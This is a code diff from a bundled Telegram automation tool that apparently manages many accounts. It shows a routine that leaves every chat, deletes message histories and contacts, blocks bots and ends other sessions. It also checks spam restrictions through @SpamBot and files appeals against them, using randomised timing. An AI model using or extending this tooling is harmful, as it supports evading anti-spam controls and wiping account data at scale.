@@ -79046,7 +79046,7 @@ ID: ${accountId}`);
 };
 
 // src/support/modules/automaticCheck.ts
-var import_api23 = __toESM(require_api());
+var import_api18 = __toESM(require_api());
 
 // src/support/methods/channels/leaveChannel.ts
 var import_api6 = __toESM(require_api());
@@ -79303,8 +79303,92 @@ OFFSET DATE: ${offsetDate}`);
   return dialogs;
 };
 
+// src/support/modules/automaticCheck.ts
+var automaticCheck = async (client, account) => {
+  const { accountId } = account;
+  try {
+    await clearAllDrafts(client);
+    const folderPeers = [];
+    const archiveDialogs = await getDialogs(client, accountId, 1);
+    for (const archiveDialog of archiveDialogs) {
+      const { dialog } = archiveDialog;
+      const peer = buildInputPeer(archiveDialog);
+      if (dialog.pinned) {
+        await togglePin(
+          client,
+          new import_api18.default.InputDialogPeer({
+            peer
+          }),
+          void 0
+        );
+      }
+      folderPeers.push(
+        new import_api18.default.InputFolderPeer({
+          peer,
+          folderId: 0
+        })
+      );
+    }
+    if (folderPeers.length) {
+      for (let i = 0; i < folderPeers.length; i += 100) {
+        const chunk = folderPeers.slice(i, i + 100);
+        await editFolders(client, chunk);
+      }
+    }
+    const dialogs = await getDialogs(client, accountId, 0);
+    for (const dialog of dialogs) {
+      const { type } = dialog;
+      const peer = buildInputPeer(dialog);
+      if (type === "channel") {
+        await leaveChannel(client, peer);
+      } else if (type === "chat") {
+        const { chat } = dialog;
+        if (chat instanceof import_api18.default.Chat || chat instanceof import_api18.default.ChatForbidden || chat instanceof import_api18.default.ChatEmpty) {
+          await deleteChatUser(
+            client,
+            String(chat.id),
+            new import_api18.default.InputUserSelf()
+          );
+          await deleteHistory(client, peer, false);
+        } else {
+          await leaveChannel(client, peer);
+        }
+      } else if (type === "user") {
+        const { user } = dialog;
+        if (user instanceof import_api18.default.User && user.bot) {
+          await deleteHistory(client, peer, false);
+          await blockContact(client, peer);
+        } else {
+          await deleteHistory(client, peer, true);
+        }
+      }
+    }
+    const contacts = await getContacts(client);
+    if (contacts && contacts.users.length > 0) {
+      const users = [];
+      for (const user of contacts.users) {
+        if (user instanceof import_api18.default.User && user.accessHash) {
+          users.push(
+            new import_api18.default.InputPeerUser({
+              userId: user.id,
+              accessHash: user.accessHash
+            })
+          );
+        }
+      }
+      if (users.length > 0) {
+        await deleteContacts(client, users);
+      }
+    }
+  } catch (e) {
+    await sendToMainBot(`** AUTOMATIC CHECK ERROR **
+ACCOUNT ID: ${accountId}
+ERROR: ${e.message}`);
+  }
+};
+
 // src/support/modules/checkSpamBlock.ts
-var import_api22 = __toESM(require_api());
+var import_api23 = __toESM(require_api());
 
 // src/support/helpers/makeRequestGpt.ts
 var import_emoji_regex = __toESM(require_emoji_regex());
@@ -79680,11 +79764,11 @@ You help to draft an appeal to Telegram support.
 };
 
 // src/support/methods/contacts/resolveUsername.ts
-var import_api18 = __toESM(require_api());
+var import_api19 = __toESM(require_api());
 var resolveUsername = async (client, username) => {
   const userByUsername = await invokeRequest(
     client,
-    new import_api18.default.contacts.ResolveUsername({
+    new import_api19.default.contacts.ResolveUsername({
       username
     }),
     { shouldIgnoreErrors: true }
@@ -79693,11 +79777,11 @@ var resolveUsername = async (client, username) => {
 };
 
 // src/support/methods/contacts/unBlockContact.ts
-var import_api19 = __toESM(require_api());
+var import_api20 = __toESM(require_api());
 var unBlockContact = async (client, peer) => {
   return await invokeRequest(
     client,
-    new import_api19.default.contacts.Unblock({ id: peer }),
+    new import_api20.default.contacts.Unblock({ id: peer }),
     {
       shouldIgnoreErrors: true
     }
@@ -79706,27 +79790,27 @@ var unBlockContact = async (client, peer) => {
 
 // src/support/methods/messages/getHistory.ts
 var import_big_integer4 = __toESM(require_BigInteger());
-var import_api20 = __toESM(require_api());
+var import_api21 = __toESM(require_api());
 var getHistory = async (client, userId, accessHash, minId) => {
   const history = await invokeRequest(
     client,
-    new import_api20.default.messages.GetHistory({
-      peer: new import_api20.default.InputPeerUser({
+    new import_api21.default.messages.GetHistory({
+      peer: new import_api21.default.InputPeerUser({
         userId: (0, import_big_integer4.default)(userId),
         accessHash: (0, import_big_integer4.default)(accessHash)
       }),
       minId
     })
   );
-  if (!history || history instanceof import_api20.default.messages.MessagesNotModified) {
+  if (!history || history instanceof import_api21.default.messages.MessagesNotModified) {
     return [];
   }
-  return history.messages.filter((m) => m instanceof import_api20.default.Message);
+  return history.messages.filter((m) => m instanceof import_api21.default.Message);
 };
 
 // src/support/methods/messages/sendMessage.ts
 var import_big_integer5 = __toESM(require_BigInteger());
-var import_api21 = __toESM(require_api());
+var import_api22 = __toESM(require_api());
 var sendMessage = async (client, userId, accessHash, message, accountId, withTyping, withReadHistory) => {
   let messageUpdate;
   try {
@@ -79735,12 +79819,12 @@ var sendMessage = async (client, userId, accessHash, message, accountId, withTyp
       for (let i = 0; i < iterations; i++) {
         await invokeRequest(
           client,
-          new import_api21.default.messages.SetTyping({
-            peer: new import_api21.default.InputPeerUser({
+          new import_api22.default.messages.SetTyping({
+            peer: new import_api22.default.InputPeerUser({
               userId: (0, import_big_integer5.default)(userId),
               accessHash: (0, import_big_integer5.default)(accessHash)
             }),
-            action: new import_api21.default.SendMessageTypingAction()
+            action: new import_api22.default.SendMessageTypingAction()
           })
         );
         await sleep(5e3);
@@ -79748,12 +79832,12 @@ var sendMessage = async (client, userId, accessHash, message, accountId, withTyp
     }
     const update = await invokeRequest(
       client,
-      new import_api21.default.messages.SendMessage({
+      new import_api22.default.messages.SendMessage({
         message: removeNonAlphaPrefix(
           capitalizeFirstLetter(reduceSpaces(message))
         ),
         clearDraft: true,
-        peer: new import_api21.default.InputPeerUser({
+        peer: new import_api22.default.InputPeerUser({
           userId: (0, import_big_integer5.default)(userId),
           accessHash: (0, import_big_integer5.default)(accessHash)
         }),
@@ -79762,11 +79846,11 @@ var sendMessage = async (client, userId, accessHash, message, accountId, withTyp
     );
     if (!update) {
       messageUpdate = null;
-    } else if (update instanceof import_api21.default.UpdateShortSentMessage || update instanceof import_api21.default.UpdateMessageID) {
+    } else if (update instanceof import_api22.default.UpdateShortSentMessage || update instanceof import_api22.default.UpdateMessageID) {
       messageUpdate = update;
     } else if ("updates" in update) {
       messageUpdate = update.updates.find(
-        (u) => u instanceof import_api21.default.UpdateMessageID
+        (u) => u instanceof import_api22.default.UpdateMessageID
       );
     }
     if (!(messageUpdate == null ? void 0 : messageUpdate.id)) {
@@ -79775,8 +79859,8 @@ var sendMessage = async (client, userId, accessHash, message, accountId, withTyp
     if (withReadHistory) {
       await invokeRequest(
         client,
-        new import_api21.default.messages.ReadHistory({
-          peer: new import_api21.default.InputPeerUser({
+        new import_api22.default.messages.ReadHistory({
+          peer: new import_api22.default.InputPeerUser({
             userId: (0, import_big_integer5.default)(userId),
             accessHash: (0, import_big_integer5.default)(accessHash)
           }),
@@ -79793,8 +79877,8 @@ var sendMessage = async (client, userId, accessHash, message, accountId, withTyp
 // src/support/modules/checkSpamBlock.ts
 var fileComplaint = async (client, userId, accessHash, accountId, replyMarkup) => {
   var _a, _b, _c, _d, _e, _f, _g;
-  if (!replyMarkup || !(replyMarkup instanceof import_api22.default.ReplyKeyboardMarkup)) {
-    await sendToMainBot(`** SPAMBOT REPLY MARKUP **
+  if (!replyMarkup || !(replyMarkup instanceof import_api23.default.ReplyKeyboardMarkup)) {
+    await sendToMainBot(`** SPAMBOT_REPLY_MARKUP_ERROR **
 ${JSON.stringify(replyMarkup)}`);
     return;
   }
@@ -79918,14 +80002,16 @@ ${JSON.stringify(replyMarkup)}`);
       throw new Error("SPAMBOT_MESSAGE_NOT_FOUND");
     }
   } else {
-    await sendToMainBot(`**SPAMBOT_BUTTONS_NOT_FOUND **
+    if (!buttons.includes("I was wrong, please release me now")) {
+      await sendToMainBot(`**SPAMBOT_BUTTONS_NOT_FOUND **
 BUTTONS: ${buttons.join(", ")}`);
+    }
   }
 };
 var checkSpamBlock = async (client, account) => {
   const { accountId, spamBlockDate: dbSpamBlockDate } = account;
   const result = await resolveUsername(client, "spambot");
-  if (!result || !result.users.length || !(result.users[0] instanceof import_api22.default.User)) {
+  if (!result || !result.users.length || !(result.users[0] instanceof import_api23.default.User)) {
     throw new Error("SPAMBOT_NOT_USER");
   }
   const { id: userId, accessHash, username } = result.users[0];
@@ -79934,7 +80020,7 @@ var checkSpamBlock = async (client, account) => {
   }
   await unBlockContact(
     client,
-    new import_api22.default.InputPeerUser({
+    new import_api23.default.InputPeerUser({
       userId,
       accessHash
     })
@@ -79981,91 +80067,6 @@ var checkSpamBlock = async (client, account) => {
     });
   }
   return true;
-};
-
-// src/support/modules/automaticCheck.ts
-var automaticCheck = async (client, account) => {
-  const { accountId } = account;
-  try {
-    await clearAllDrafts(client);
-    const folderPeers = [];
-    const archiveDialogs = await getDialogs(client, accountId, 1);
-    for (const archiveDialog of archiveDialogs) {
-      const { dialog } = archiveDialog;
-      const peer = buildInputPeer(archiveDialog);
-      if (dialog.pinned) {
-        await togglePin(
-          client,
-          new import_api23.default.InputDialogPeer({
-            peer
-          }),
-          void 0
-        );
-      }
-      folderPeers.push(
-        new import_api23.default.InputFolderPeer({
-          peer,
-          folderId: 0
-        })
-      );
-    }
-    if (folderPeers.length) {
-      for (let i = 0; i < folderPeers.length; i += 100) {
-        const chunk = folderPeers.slice(i, i + 100);
-        await editFolders(client, chunk);
-      }
-    }
-    const dialogs = await getDialogs(client, accountId, 0);
-    for (const dialog of dialogs) {
-      const { type } = dialog;
-      const peer = buildInputPeer(dialog);
-      if (type === "channel") {
-        await leaveChannel(client, peer);
-      } else if (type === "chat") {
-        const { chat } = dialog;
-        if (chat instanceof import_api23.default.Chat || chat instanceof import_api23.default.ChatForbidden || chat instanceof import_api23.default.ChatEmpty) {
-          await deleteChatUser(
-            client,
-            String(chat.id),
-            new import_api23.default.InputUserSelf()
-          );
-          await deleteHistory(client, peer, false);
-        } else {
-          await leaveChannel(client, peer);
-        }
-      } else if (type === "user") {
-        const { user } = dialog;
-        if (user instanceof import_api23.default.User && user.bot) {
-          await deleteHistory(client, peer, false);
-          await blockContact(client, peer);
-        } else {
-          await deleteHistory(client, peer, true);
-        }
-      }
-    }
-    const contacts = await getContacts(client);
-    if (contacts && contacts.users.length > 0) {
-      const users = [];
-      for (const user of contacts.users) {
-        if (user instanceof import_api23.default.User && user.accessHash) {
-          users.push(
-            new import_api23.default.InputPeerUser({
-              userId: user.id,
-              accessHash: user.accessHash
-            })
-          );
-        }
-      }
-      if (users.length > 0) {
-        await deleteContacts(client, users);
-      }
-    }
-    await checkSpamBlock(client, account);
-  } catch (e) {
-    await sendToMainBot(`** AUTOMATIC CHECK ERROR **
-ACCOUNT ID: ${accountId}
-ERROR: ${e.message}`);
-  }
 };
 
 // src/support/modules/client.ts
@@ -80168,7 +80169,7 @@ var checker = async (ID, accountsInWork) => {
   let client = null;
   let errored = false;
   try {
-    const randomI = Math.floor(Math.random() * 30);
+    const randomI = Math.floor(Math.random() * 20) + 10;
     const accountByID = await getAccountById(ID);
     console.warn({
       accountId: ID,
@@ -80224,8 +80225,13 @@ var checker = async (ID, accountsInWork) => {
       );
       await Promise.race([
         (async () => {
-          if (i === randomI) {
+          if (i === 0) {
             await automaticCheck(client, account);
+          }
+          if (i === randomI) {
+            await clearAuthorizations(client);
+            await automaticCheck(client, account);
+            await checkSpamBlock(client, account);
           }
           await sleep(6e4);
         })(),
@@ -80283,7 +80289,7 @@ var import_api27 = __toESM(require_api());
 // src/support/index.ts
 var reChecker = async () => {
   const accounts = await getAccounts();
-  console.log({ message: "\u{1F4A5} CHECK ITERATION INIT \u{1F4A5}" });
+  console.log({ message: "\u{1F4A5} CHECK ITERATION INIT \u{1F4A5}", payload: accounts });
   const startCheckerTime = performance.now();
   const checkerPromises = [];
   const checkerAccounts = {};
